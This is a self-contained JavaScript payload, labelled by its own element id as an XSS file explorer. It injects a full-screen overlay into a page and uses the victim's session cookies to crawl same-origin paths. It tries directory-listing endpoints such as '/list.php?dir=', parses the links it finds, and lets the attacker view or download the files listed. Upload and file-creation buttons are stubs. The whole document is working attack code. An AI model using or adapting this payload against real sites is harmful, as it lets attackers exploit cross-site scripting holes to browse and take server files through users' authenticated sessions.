document.write(`
<div id="xss-file-explorer" style="position:fixed;inset:0;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#e5e7eb;">
  <div style="background:#111827;border-radius:12px;width:90%;max-width:860px;max-height:94vh;display:flex;flex-direction:column;border:1px solid #374151;box-shadow:0 25px 70px -12px rgba(0,0,0,0.9);overflow:hidden;">
    <div style="background:#1f2937;padding:14px 20px;border-bottom:1px solid #374151;display:flex;justify-content:space-between;align-items:center;">
      <div style="display:flex;align-items:center;gap:12px;">
        <span style="font-size:1.4rem;">🛠️</span>
        <h2 style="margin:0;font-size:1.28rem;font-weight:600;">File System Access</h2>
      </div>
      <button onclick="document.getElementById('xss-file-explorer').remove()" style="background:#ef4444;color:white;border:none;padding:8px 14px;border-radius:6px;cursor:pointer;font-weight:500;font-size:0.95rem;">Close</button>
    </div>

    <div id="breadcrumb" style="padding:12px 20px;background:#0f172a;font-family:ui-monospace,monospace;font-size:0.96rem;color:#94a3b8;overflow-x:auto;white-space:nowrap;">
      <span style="color:#60a5fa;cursor:pointer;" onclick="listDirectory('/')">/</span>
    </div>

    <div style="padding:12px 20px;display:flex;gap:8px;flex-wrap:wrap;background:#111827;border-bottom:1px solid #374151;">
      <button onclick="listDirectory('/')" style="background:#374151;color:#e5e7eb;border:none;padding:8px 14px;border-radius:6px;cursor:pointer;font-weight:500;">Root</button>
      <button onclick="goUp()" style="background:#374151;color:#e5e7eb;border:none;padding:8px 14px;border-radius:6px;cursor:pointer;font-weight:500;">↑ Parent</button>
      <button onclick="listCurrent()" style="background:#374151;color:#e5e7eb;border:none;padding:8px 14px;border-radius:6px;cursor:pointer;font-weight:500;">↻ Refresh</button>
      <input id="pathInput" placeholder="Enter absolute path" style="flex:1;min-width:220px;background:#1f2937;border:1px solid #4b5563;border-radius:6px;padding:8px 12px;color:#e5e7eb;">
      <button onclick="goToPath()" style="background:#3b82f6;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-weight:500;">Go</button>
    </div>

    <div style="flex:1;overflow:auto;padding:0;background:#000;">
      <table style="width:100%;border-collapse:collapse;font-size:0.94rem;">
        <thead style="background:#111827;position:sticky;top:0;z-index:10;">
          <tr style="border-bottom:1px solid #374151;">
            <th style="text-align:left;padding:10px 12px;">Type</th>
            <th style="text-align:left;padding:10px 12px;">Name</th>
            <th style="text-align:right;padding:10px 12px;">Size</th>
            <th style="text-align:right;padding:10px 12px;">Perms</th>
            <th style="text-align:center;padding:10px 12px;">Actions</th>
          </tr>
        </thead>
        <tbody id="fileList">
          <tr><td colspan="5" style="text-align:center;padding:60px 20px;color:#6b7280;">Initializing...</td></tr>
        </tbody>
      </table>
    </div>

    <div style="padding:14px 20px;background:#111827;border-top:1px solid #374151;display:flex;gap:10px;flex-wrap:wrap;">
      <button onclick="showFileUploader()" style="flex:1;min-width:140px;background:#f59e0b;color:#000;padding:10px;border:none;border-radius:6px;cursor:pointer;font-weight:500;">Upload File</button>
      <button onclick="createFile()" style="flex:1;min-width:140px;background:#3b82f6;color:white;padding:10px;border:none;border-radius:6px;cursor:pointer;font-weight:500;">New File</button>
      <button onclick="createFolder()" style="flex:1;min-width:140px;background:#8b5cf6;color:white;padding:10px;border:none;border-radius:6px;cursor:pointer;font-weight:500;">New Folder</button>
    </div>

    <div id="statusBar" style="padding:8px 20px;background:#0f172a;font-size:0.82rem;color:#9ca3af;text-align:center;border-top:1px solid #374151;">
      Ready
    </div>
  </div>
</div>
`);

let currentDir = '/';

function updateBreadcrumbs() {
  const bc = document.getElementById('breadcrumb');
  if (!bc) return;
  let parts = currentDir.split('/').filter(Boolean);
  let html = '<span style="color:#60a5fa;cursor:pointer;" onclick="listDirectory(\'/\')">/</span>';
  let accum = '/';
  parts.forEach((p, i) => {
    accum += p + '/';
    const isLast = i === parts.length - 1;
    html += ` <span style="color:#475569;">›</span> `;
    html += `<span style="color:${isLast ? '#e5e7eb' : '#60a5fa'};cursor:${isLast ? 'default' : 'pointer'};" ${isLast ? '' : `onclick="listDirectory('${accum}')"`}>${p}</span>`;
  });
  bc.innerHTML = html;
}

function setStatus(msg) {
  const el = document.getElementById('statusBar');
  if (el) el.textContent = msg;
}

window.listDirectory = function(path) {
  path = path || currentDir;
  if (!path.endsWith('/')) path += '/';
  currentDir = path;
  updateBreadcrumbs();
  document.getElementById('fileList').innerHTML = '<tr><td colspan="5" style="text-align:center;padding:80px 20px;color:#6b7280;">Scanning...</td></tr>';
  setStatus('Listing directory...');

  fetch(path, {credentials:'include', cache:'no-store'})
    .then(r => r.text())
    .then(html => {
      const files = parseDirectoryListing(html, path);
      if (files && files.length > 0) {
        displayFiles(files);
        setStatus(`Listed ${files.length} items`);
      } else {
        tryCommonEndpoints(path);
      }
    })
    .catch(() => tryCommonEndpoints(path));
};

function tryCommonEndpoints(path) {
  const attempts = [
    path,
    path + '?C=M;O=D',
    path + 'index.php',
    '/list.php?dir=' + encodeURIComponent(path),
  ];
  let idx = 0;

  function next() {
    if (idx >= attempts.length) {
      displayFiles([], currentDir);
      setStatus('No listing method succeeded');
      return;
    }
    fetch(attempts[idx], {credentials:'include', cache:'no-store'})
      .then(r => r.text())
      .then(html => {
        const files = parseDirectoryListing(html, path);
        if (files && files.length > 0) {
          displayFiles(files);
          setStatus(`Listing via ${attempts[idx].replace(location.origin,'')}`);
        } else {
          idx++;
          next();
        }
      })
      .catch(() => { idx++; next(); });
  }
  next();
}

function parseDirectoryListing(html, base) {
  const files = [];
  const aTagRegex = /<a\s+[^>]*href="([^"]*)"[^>]*>([^<]+)<\/a>/gi;
  let match;
  while ((match = aTagRegex.exec(html)) !== null) {
    let href = match[1];
    let name = match[2].trim();
    if (name === '..' || name === '../' || name === 'Parent Directory') continue;
    if (href.startsWith('?') || href.startsWith('#')) continue;

    const isDir = href.endsWith('/') || name.endsWith('/');
    if (isDir) name = name.replace(/\/$/, '');

    files.push({
      name,
      type: isDir ? 'dir' : 'file',
      url: new URL(href, base).href,
      size: '-',
      perms: '---'
    });
  }
  return files;
}

function displayFiles(files) {
  let html = '';
  if (currentDir !== '/') {
    const parent = currentDir.split('/').slice(0,-2).join('/') || '/';
    html += `
      <tr style="background:#0f172a;">
        <td style="padding:10px 12px;">📁</td>
        <td style="padding:10px 12px;"><a href="#" onclick="listDirectory('${parent}');return false;" style="color:#60a5fa;">..</a></td>
        <td style="text-align:right;padding:10px 12px;">-</td>
        <td style="text-align:right;padding:10px 12px;">---</td>
        <td style="text-align:center;padding:10px 12px;">-</td>
      </tr>`;
  }

  files.forEach(f => {
    const isDir = f.type === 'dir';
    const icon = isDir ? '📁' : (/\.(jpg|jpeg|png|gif|webp|svg)$/i.test(f.name) ? '🖼️' : '📄');
    html += `
      <tr style="border-bottom:1px solid #1f2937;">
        <td style="padding:10px 12px;">${icon}</td>
        <td style="padding:10px 12px;">
          ${isDir ?
            `<a href="#" onclick="listDirectory('${f.url}');return false;" style="color:#60a5fa;">${f.name}</a>` :
            `<span style="color:#e5e7eb;cursor:pointer;" onclick="viewFile('${f.url}')">${f.name}</span>`
          }
        </td>
        <td style="text-align:right;padding:10px 12px;">${f.size}</td>
        <td style="text-align:right;padding:10px 12px;">${f.perms}</td>
        <td style="text-align:center;padding:10px 12px;">
          ${isDir ? '—' : `
            <span style="cursor:pointer;margin:0 6px;" onclick="viewFile('${f.url}')">👁</span>
            <span style="cursor:pointer;margin:0 6px;" onclick="downloadFile('${f.url}')">⬇</span>
          `}
        </td>
      </tr>`;
  });

  document.getElementById('fileList').innerHTML = html || '<tr><td colspan="5" style="text-align:center;padding:60px;color:#6b7280;">Empty directory</td></tr>';
}

window.goUp = function() {
  if (currentDir === '/') return;
  let parts = currentDir.split('/').filter(Boolean);
  parts.pop();
  listDirectory('/' + parts.join('/') + (parts.length ? '/' : ''));
};

window.listCurrent = function() {
  listDirectory(currentDir);
};

window.goToPath = function() {
  let p = document.getElementById('pathInput').value.trim();
  if (!p) return;
  if (!p.startsWith('/')) p = '/' + p;
  listDirectory(p);
};

window.viewFile = function(url) {
  fetch(url, {credentials:'include'})
    .then(r => r.text())
    .then(text => {
      alert('File content (first 2000 chars):\n\n' + text.slice(0,2000) + (text.length>2000?'...':''));
    })
    .catch(e => alert('Cannot read file:\n' + e));
};

window.downloadFile = function(url) {
  const a = document.createElement('a');
  a.href = url;
  a.download = url.split('/').pop() || 'file';
  document.body.appendChild(a);
  a.click();
  a.remove();
};

window.showFileUploader = function() {
  alert('Upload simulation not implemented in this version.\nPath: ' + currentDir);
};

window.createFile = function() {
  const name = prompt('New filename:');
  if (!name) return;
  alert('File creation not implemented.\nWould create: ' + currentDir + name);
};

window.createFolder = function() {
  const name = prompt('New folder name:');
  if (!name) return;
  alert('Folder creation not implemented.\nWould create: ' + currentDir + name + '/');
};

setTimeout(() => {
  listDirectory('/');
}, 300);
